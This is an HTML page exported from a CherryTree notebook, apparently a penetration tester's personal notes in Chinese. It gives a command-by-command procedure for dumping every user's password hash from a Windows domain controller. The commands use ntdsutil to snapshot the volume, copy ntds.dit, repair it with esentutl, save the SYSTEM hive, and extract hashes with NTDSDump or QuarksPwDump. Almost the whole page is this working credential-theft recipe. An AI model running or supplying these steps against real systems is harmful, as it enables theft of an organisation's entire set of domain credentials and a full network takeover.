<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>域控所有用户hash</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>域控所有用户hash</h1><br/><a href="https://www.secpulse.com/archives/6301.html">https://www.secpulse.com/archives/6301.html</a><br /><br />通过磁盘卷影获取Windows域控所有用户hash<br />查询当前快照<br />ntdsutil snapshot &quot;List All&quot; quit quit<br />ntdsutil snapshot &quot;List Mounted&quot; quit quit<br /><br />在2008+域控上使用 ntdsutil snapshot mount导出ntds.dit， SAM以及System ，<br />导出ntds.dit<br />创建快照,返回uuid<br />ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit<br /><br />加载快照<br />ntdsutil snapshot &quot;mount {78a8e3a8-cc4f-4d40-a303-d7a159c5a2aa}&quot; quit quit<br /><br />复制ntds,dit<br />copy C:\$SNAP_201908291617_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit<br /><br />卸载快照<br />ntdsutil snapshot  &quot;unmount {78a8e3a8-cc4f-4d40-a303-d7a159c5a2aa}&quot; quit quit<br /><br />删除快照<br />ntdsutil snapshot  &quot;delete {78a8e3a8-cc4f-4d40-a303-d7a159c5a2aa}&quot; quit quit<br /><br /><br />esentutl /p /o ntds.dit<br />修复数据库<br /><br />reg save HKLM\SYSTEM system.hiv<br />NTDSDump.exe -f ntds.dit -s system.hiv -o SecPulseHash.txt<br /><table style="display:inline-table"><tr><td><a href="EmbeddedFiles\229-ntdsdump.zip">Linked file: ntdsdump.zip </a></td></tr></table><br /> 或<br /> <a href="https://github.com/quarkslab/quarkspwdump">https://github.com/quarkslab/quarkspwdump</a><br />在域控上使用 QuarksPwDump.exe 导出绝大部分明文:<br />QuarksPwDump.exe --dump-hash-domain --output SecPulseHash.txt --ntds-file c:\ntds.dit<br />下载回本地再用QuarksPwDump似乎就不行,主要因为本地无法指定SYSTEM文件导致获取不到key<br /><br />获取明文<p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>